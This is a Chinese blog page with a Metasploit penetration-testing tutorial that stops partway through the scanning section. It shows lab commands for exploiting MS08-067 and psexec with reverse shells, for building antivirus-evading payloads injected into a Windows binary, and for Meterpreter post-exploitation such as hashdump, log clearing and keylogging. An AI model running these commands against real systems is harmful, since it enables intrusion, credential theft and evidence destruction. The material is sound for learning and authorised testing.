<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://shu1l.github.io/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="欢迎来到Shu1L的神秘小屋！">
<meta property="article:author" content="Shu1L">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://shu1l.github.io/page/2/"/>





  <title>Hexo</title>
  








<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/%20" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/" itemprop="url">渗透测试——Mestasploit基本使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:52:51+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>title: Mestasploit基本使用学习<br>abbrlink: 6042<br>date: 2020-04-03 19:52:51<br>tags:</p>
<h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
</ul>
<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
</li>
<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
</li>
<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
<ul>
<li>框架继承了渗透测试标准（PETS）标准</li>
<li>一定程度上统一了渗透测试研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li><p>开发活跃版本更新频繁</p>
<ul>
<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
<li>目前分化为四个版本，社区版依然十分活跃</li>
<li>HD More说：为 Metasploit 写书是种自虐</li>
</ul>
</li>
<li><p>Metasploit 默认集成 kali linux 中</p>
</li>
<li><p>使用 postgresql 数据库存储数据</p>
<ul>
<li>早期版本需要先启动数据库再启动 msf</li>
</ul>
<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
</li>
</ul>
<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的的 API 接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin 插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
<li>模块<ul>
<li>/usr/share/metasploit-framework/modules/</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
</ul>
</li>
<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
<li>shellcode 或系统命令</li>
<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
<li>stages：利用 stager 建立的连接下载的后续payload</li>
<li>stager、stages 都有多种类型，适用于不同场景</li>
<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
</ul>
</li>
<li>技术功能模块（不是流程模块）<ul>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
<li>Nops：提高 paylaod 稳定性及维持大小</li>
</ul>
</li>
</ul>
<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
<li>使用前先升级：<strong>msfupdate</strong></li>
<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
<li>msfconsole 使用接口<ul>
<li>最流行的用户接口</li>
<li>几乎可以使用全部 msf 功能</li>
<li>控制台命令支持 TAB 自动补全</li>
<li>支持外部命令的执行（系统命令等）</li>
</ul>
</li>
<li>点击鼠标启动</li>
</ul>
<pre><code>通用选项:
    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;

数据库选项:
    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
    -n, --no-database                禁用数据库支持
    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件

框架选项:
    -c FILE                          加载指定的配置文件
    -v, -V, --version                显示版本

模块选项:
        --defer-module-loads         除非明确询问，否则推迟模块加载
    -m, --module-path DIRECTORY      加载一个额外的模块路径

控制台选项:
    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
    -H, --history-file FILE          将命令历史记录保存到指定的文件
    -L, --real-readline              使用系统Readline库而不是RbReadline
    -o, --output FILE                输出到指定的文件
    -p, --plugin PLUGIN              在启动时加载插件
    -q, --quiet                      不要在启动时显示 banner 信息
    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
    -h, --help                       显示此消息</code></pre><ul>
<li>进入 msfconsole，查看帮助信息</li>
</ul>
<pre><code>root@kali:~# msfconsole
msf &gt; help

核心命令
=============

    命令            描述
    -------       -----------
    ?             帮助菜单
    banner        显示一个很棒的metasploit横幅
    cd            更改当前的工作目录
    color         切换高亮显示颜色
    connect       连接与主机通信
    exit          退出退出控制台
    get           获取特定于上下文的变量的值
    getg          获取全局变量的值
    grep          Grep另一个命令的输出
    help          帮助菜单
    history       历史显示命令历史
    irb           进入irb脚本模式
    load          加载一个框架插件
    quit          退出控制台
    route         路由通过会话路由流量
    save          保存保存活动的数据存储
    sessions      会话转储会话列表并显示有关会话的信息
    set           将特定于上下文的变量设置为一个值
    setg          将全局变量设置为一个值
    sleep         睡眠在指定的秒数内不执行任何操作
    spool         将控制台输出写入文件以及屏幕
    threads       线程查看和操作后台线程
    unload        卸载卸载框架插件
    unset         取消设置取消设置一个或多个特定于上下文的变量
    unsetg        取消设置取消设置一个或多个全局变量
    version       版本显示框架和控制台库版本号


模块命令
===============

    命令            描述
    -------       -----------
    advanced      高级显示一个或多个模块的高级选项
    back          返回从当前上下文返回
    edit          编辑使用首选编辑器编辑当前模块或文件
    info          显示有关一个或多个模块的信息
    loadpath      加载路径搜索并加载路径中的模块
    options       选项显示全局选项或一个或多个模块
    popm          将最新的模块从堆栈弹出并使其处于活动状态
    previous      将之前加载的模块设置为当前模块
    pushm         将活动或模块列表推入模块堆栈
    reload_all    重新加载所有定义的模块路径中的所有模块
    reload_lib    从指定路径加载库文件
    search        搜索搜索模块名称和说明
    show          显示给定类型的模块或所有模块
    use           使用按名称选择模块


工作命令
============

    命令            描述
    -------       -----------
    handler       处理程序作为作业启动负载处理程序
    jobs          作业显示和管理作业
    kill          杀死一份工作
    rename_job    重命名作业


资源脚本命令
========================

    命令            描述
    -------       -----------
    makerc        保存从开始到文件输入的命令
    resource      运行存储在文件中的命令


数据库后端命令
=========================

    命令                描述
    -------           -----------
    db_connect        连接到现有的数据库
    db_disconnect     断开当前数据库实例
    db_export         导出包含数据库内容的文件
    db_import         导入扫描结果文件（文件类型将被自动检测）
    db_nmap           执行nmap并自动记录输出
    db_rebuild_cache  重建数据库存储的模块缓存
    db_status         显示当前的数据库状态
    hosts             列出数据库中的所有主机
    loot              列出数据库中的所有战利品
    notes             列出数据库中的所有注释
    services          列出数据库中的所有服务
    vulns             列出数据库中的所有漏洞
    workspace         在数据库工作区之间切换


凭证后端命令
============================

    命令            描述
    -------       -----------
    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
<li>msf &gt; help show</li>
</ul>
<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
<li>msf &gt; help search</li>
</ul>
<pre><code>用法: search [keywords]

Keywords:
  app       :  客户端或服务器攻击的模块
  author    :  本作者编写的模块
  bid       :  具有匹配的Bugtraq ID的模块
  cve       :  具有匹配CVE ID的模块
  edb       :  具有匹配的Exploit-DB ID的模块
  name      :  具有匹配描述性名称的模块
  platform  :  影响这个平台的模块
  ref       :  具有匹配参考的模块
  type      :  特定类型的模块（exploit，auxiliary或post）

msf &gt; search ms08-067
msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
<li>模块内命令</li>
</ul>
<pre><code>msf &gt; search ms09_001_write
msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info

[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets



msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
    用法：编辑[file / to / edit.rb]
    使用编辑当前活动模块或本地文件。
    如果指定了文件路径，它将在编辑后自动重新加载。
    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
<li>数据库操作</li>
</ul>
<pre><code>msf &gt; help db_connect 
    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
    [*]       OR: db_connect -y [path/to/database.yml]
    [*] Examples:
    [*]        db_connect user@metasploit3
    [*]        db_connect user:pass@192.168.0.2/metasploit3
    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3

msf &gt; help db_import
    Usage: db_import &lt;filename&gt; [file2...]
    Filenames can be globs like *.xml, or **/*.xml which will search recursively

msf &gt; help db_export
    Usage:
    db_export -f &lt;format&gt; [filename]
    Format can be one of: xml, pwdump</code></pre><ul>
<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
</ul>
<pre><code>活动的会话操作和交互。

选项:

    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
    -K        终止所有会话
    -S &lt;opt&gt;  行搜索过滤器。
    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
    -h        帮助横幅
    -i &lt;opt&gt;  与提供的会话ID进行交互
    -k &lt;opt&gt;  按会话ID和/或范围终止会话
    -l        列出所有活动会话
    -n &lt;opt&gt;  按ID命名或重命名会话
    -q        静音模式
    -r        重置用-i或全部给定的会话的环形缓冲区
    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
    -t &lt;opt&gt;  设置响应超时（默认值：15）
    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
    -v        以详细模式列出会话
    -x        在会话表中显示扩展信息

许多选项允许使用逗号和破折号指定会话范围。
例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
<pre><code>root@kali:~# cat ms08067.rb 
use exploit/windows/smb/ms08_067_netapi
set RHOST 10.10.10.147
set RPORT 445
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
<pre><code>root@kali:~# cat psexec.rb 
use exploit/windows/smb/psexec
set RHOST 10.10.10.148
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
set SMBUSER Administrator
set SMBPASS 123456
exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
<pre><code>root@kali:~# cat ms07017.rb 
use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
set URIPATH /
set SRVHOST 0.0.0.0
set PAYLOAD windows/shell/reverse_tcp
set EXITFUNC thread
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
<li>用法</li>
</ul>
<pre><code>msf &gt; search ms08-067
msf &gt; use payload/windows/shell/bind_tcp
msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
msf payload(windows/shell/bind_tcp) &gt; generate -h
    Usage: generate [options]
    Generates a payload.
    OPTIONS:
        -E        强制编码。
        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
        -e &lt;opt&gt;  要使用的编码器模块的名称。
        -f &lt;opt&gt;  输出文件名（否则为stdout）
        -h        帮助横幅。
        -i &lt;opt&gt;  编码迭代的次数。
        -k        保持模板可执行的功能
        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
        -p &lt;opt&gt;  输出平台
        -s &lt;opt&gt;  NOP sled length.
        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
        -x &lt;opt&gt;  要使用的可执行模板

msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
<ul>
<li>自动绕过坏字符</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
<li>手动指定编码模块</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
<ul>
<li>注入文件</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
<ul>
<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
<li>增加一行 EOP</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
</ul>
<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>高级、动态、可扩展的 payload<ul>
<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
<li>注入合法系统进程并建立 stager</li>
<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用 c 语言编写</li>
<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
</ul>
<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set RHOST 10.10.10.147
set LHOST 10.10.10.131
run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
<ul>
<li>帮助文件</li>
</ul>
<pre><code>meterpreter &gt; help

核心命令
=============

    命令                     描述
    -------                   -----------
    ?                         帮助菜单
    background                背景当前会话
    bgkill                    杀死一个背景meterpreter脚本
    bglist                    列出运行后台脚本
    bgrun                     执行一个meterpreter脚本作为后台线程
    channel                   显示信息或控制活动频道
    close                     关闭频道
    disable_unicode_encoding  禁用unicode字符串的编码
    enable_unicode_encoding   启用unicode字符串的编码
    exit                      终止meterpreter会话
    get_timeouts              获取当前会话超时值
    guid                      获取会话GUID
    help                      帮助菜单
    info                      显示有关Post模块的信息
    irb                       进入irb脚本模式
    load                      加载一个或多个meterpreter扩展
    machine_id                获取连接到会话的计算机的MSF ID
    migrate                   将服务器迁移到另一个进程
    pivot                     管理数据透视监听器
    quit                      终止meterpreter会话
    read                      从频道读取数据
    resource                  运行存储在文件中的命令
    run                       执行meterpreter脚本或Post模块
    sessions                  快速切换到另一个会话
    set_timeouts              设置当前会话超时值
    sleep                     Force Meterpreter安静，然后重新建立会话。
    transport                 更改当前的传输机制
    use                       不推荐使用“加载”别名
    uuid                      获取当前会话的UUID
    write                     将数据写入通道


Stdapi: 文件系统命令
============================

    命令          描述
    -------       -----------
    cat           将文件的内容读取到屏幕上
    cd            更改目录
    checksum      检索文件的校验和
    cp            将源复制到目标
    dir           列表文件（ls的别名）
    download      下载文件或目录
    edit          编辑一个文件
    getlwd        打印本地工作目录
    getwd         打印工作目录
    lcd           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列出文件
    mkdir         建立目录
    mv            将源移到目标
    pwd           打印工作目录
    rm            删除指定的文件
    rmdir         删除目录
    search        搜索文件
    show_mount    列出所有安装点/逻辑驱动器
    upload        上传文件或目录


Stdapi: 网络命令
===========================

    命令          描述
    -------       -----------
    arp           显示主机ARP缓存
    getproxy      显示当前的代理配置
    ifconfig      显示界面
    ipconfig      显示界面
    netstat       显示网络连接
    portfwd       将本地端口转发到远程服务
    resolve       解析目标上的一组主机名
    route         查看和修改路由表


Stdapi: 系统命令
=======================

    Command       Description
    -------       -----------
    clearev       清除事件日志
    drop_token    放弃任何活动的模拟令牌。
    execute       执行一个命令
    getenv        获取一个或多个环境变量值
    getpid        获取当前的进程标识符
    getprivs      尝试启用当前进程可用的所有权限
    getsid        获取运行服务器的用户的SID
    getuid        获取服务器正在运行的用户
    kill          终止一个过程
    localtime     显示目标系统的本地日期和时间
    pgrep         按名称过滤进程
    pkill         按名称终止进程
    ps            列出运行的进程
    reboot        重新启动远程计算机
    reg           修改远程注册表并与之交互
    rev2self      在远程机器上调用RevertToSelf（）
    shell         放入系统命令外壳
    shutdown      关闭远程计算机
    steal_token   尝试从目标进程中盗取模拟令牌
    suspend       暂停或恢复进程列表
    sysinfo       获取有关远程系统的信息，例如OS


Stdapi: 用户界面命令
===============================

    命令          描述
    -------        -----------
    enumdesktops   列出所有可访问的桌面和窗口工作站
    getdesktop     获取当前meterpreter桌面
    idletime       返回远程用户闲置的秒数
    keyscan_dump   转储按键缓冲区
    keyscan_start  开始捕捉击键
    keyscan_stop   停止捕获击键
    screenshot     获取交互式桌面的屏幕截图
    setdesktop     更改meterpreters当前桌面
    uictl          控制一些用户界面组件


Stdapi: Webcam 命令
=======================

    命令          描述
    -------        -----------
    record_mic     从默认麦克风录制音频X秒
    webcam_chat    开始视频聊天
    webcam_list    列出网络摄像头
    webcam_snap    从指定的摄像头拍摄快照
    webcam_stream  从指定的摄像头播放视频流


Priv: Elevate Commands
======================

    命令          描述
    -------       -----------
    getsystem     尝试将您的特权提升为本地系统的特权。


Priv: 密码数据库命令
================================

    命令          描述
    -------       -----------
    hashdump      转储SAM数据库的内容


Priv: Timestomp 命令
========================

    命令          描述
    -------       -----------
    timestomp     操纵文件MACE属性</code></pre><ul>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; execute -f cmd.exe
meterpreter &gt; ps
meterpreter &gt; getuid
meterpreter &gt; getpid
meterpreter &gt; clearev   # 清除日志
meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件

meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1

meterpreter &gt; hashdump  # 读取密码
meterpreter &gt; run post/windows/gather/hashdump  # 读取密码

meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
<li>2015 年11月份，来自社区贡献</li>
<li>无需运行环境，在客户端运行原生 python 代码</li>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; load python
meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd



root@kali:~# cat find2.py 
import os
for root,dirs,files in os.walk(c://*):
    for file in files:
        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
            print(os.path.john(root,file))
python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
<li>2015 年6月已经被取消</li>
<li>由 msfconsole -x 取代</li>
<li>编写脚本时便于引用</li>
</ul>
<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
</ul>
<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
<li>auxiliary 目录下</li>
<li>RHOSTS &lt;&gt; RHOST<ul>
<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
<li>也可以编写地址列表：file:/root/h.txt</li>
</ul>
</li>
</ul>
<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
<li>use auxiliary/scanner/discovery/arp_sweep</li>
<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
</ul>
<pre><code>msf &gt; search arp
msf &gt; use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
<li>use auxiliary/scanner/portscan/syn</li>
<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
</ul>
<pre><code>msf &gt; search portscan
msf &gt; use auxiliary/scanner/portscan/syn
msf auxiliary(scanner/portscan/syn) &gt; show options 
msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
<li>查找 ipidseq 主机（查找僵尸机）<ul>
<li>use auxiliary/scanner/ip/ipidseq</li>
